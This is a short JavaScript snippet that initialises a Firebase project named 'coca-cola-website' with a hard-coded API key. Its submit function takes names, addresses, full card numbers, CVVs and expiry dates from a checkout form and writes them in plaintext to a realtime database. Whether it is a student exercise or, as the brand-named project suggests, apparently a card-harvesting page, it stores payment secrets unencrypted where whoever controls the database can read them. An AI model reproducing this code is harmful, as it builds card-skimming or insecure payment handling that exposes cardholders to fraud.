  var firebaseConfig = {
    apiKey: "AIzaSyD1VbxOhG_FwLVUn1Pm5D_TtnsvPqCnwmI",
    authDomain: "coca-cola-website.firebaseapp.com",
    databaseURL: "https://coca-cola-website.firebaseio.com",
    projectId: "coca-cola-website",
    storageBucket: "coca-cola-website.appspot.com",
    messagingSenderId: "188421422677",
    appId: "1:188421422677:web:61507da6a2c1a609"
  };
  firebase.initializeApp(firebaseConfig);

  function submit(){

var fname= document.getElementById('fname').value;
var email= document.getElementById('email').value;
var adr= document.getElementById('adr').value;
var city= document.getElementById('city').value;
var cname= document.getElementById('cname').value;
var state= document.getElementById('state').value;
var zip= document.getElementById('zip').value;
var expyear= document.getElementById('expyear').value;
var ccnum= document.getElementById('ccnum').value;
var expmonth= document.getElementById('expmonth').value;
var cvv= document.getElementById('cvv').value;

   firebase.database().ref('user/name').set(fname);
   firebase.database().ref('user/state').set(state);
   firebase.database().ref('user/zip').set(zip);
   firebase.database().ref('user/email').set(email);
   firebase.database().ref('user/city').set(city);
   firebase.database().ref('user/address').set(adr);
   firebase.database().ref('user/card details/name').set(cname);
   firebase.database().ref('user/card details/card number').set(ccnum);
   firebase.database().ref('user/card details/cvv').set(cvv);
   firebase.database().ref('user/card details/expmonth').set(expmonth);
   firebase.database().ref('user/card details/expyear').set(expyear);
  }
  
  
  
  
  
  
  
  
  
  
  
  
  
  